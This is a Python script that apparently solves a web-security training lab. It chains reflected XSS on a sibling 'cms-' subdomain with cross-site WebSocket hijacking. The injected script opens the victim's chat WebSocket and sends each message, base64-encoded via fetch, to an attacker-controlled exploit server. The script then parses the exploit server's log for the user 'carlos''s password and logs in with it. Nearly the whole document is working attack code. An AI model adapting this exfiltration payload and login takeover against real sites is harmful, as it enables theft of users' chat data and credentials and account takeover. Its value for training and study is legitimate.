import base64
import time
import urllib.parse
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
chat_url = burp_url + '/chat'


session = requests.Session()

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

raw_data = f"""
<script>
    var ws = new WebSocket('wss://{burp_url[8:]}/chat');
    ws.onopen = function() {{
        ws.send("READY");
    }};
    ws.onmessage = function(event) {{
        fetch('{exploit_server}/exploit?xxxx='+btoa(event.data));
    }};
</script>
"""


encoded_data = urllib.parse.quote(raw_data, safe='')

#print(encoded_data)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<script>\r\n    document.location = \"https://cms-{burp_url[8:]}/login?username={encoded_data}&password=anything\";\r\n</script>", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

time.sleep(2)
session.get(exploit_server+'/deliver-to-victim')

log_url = exploit_server + '/log'

response = session.get(log_url)

base64_regex = re.compile(r'/exploit\?xxxx=([A-Za-z0-9+/=]+)')
matches = base64_regex.findall(response.text)

password_regex = re.compile(r"[0-9a-zA-Z]{20}")

carlos_password = None

for match in matches:
    decoded_data = base64.b64decode(match).decode('utf-8')
    password_match = password_regex.search(decoded_data)

    if password_match:
        carlos_password = password_match.group(0)
        break

if carlos_password:
    print(carlos_password)

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf,"username": "carlos", "password": carlos_password}
session.post(login_url, data=burp_data)
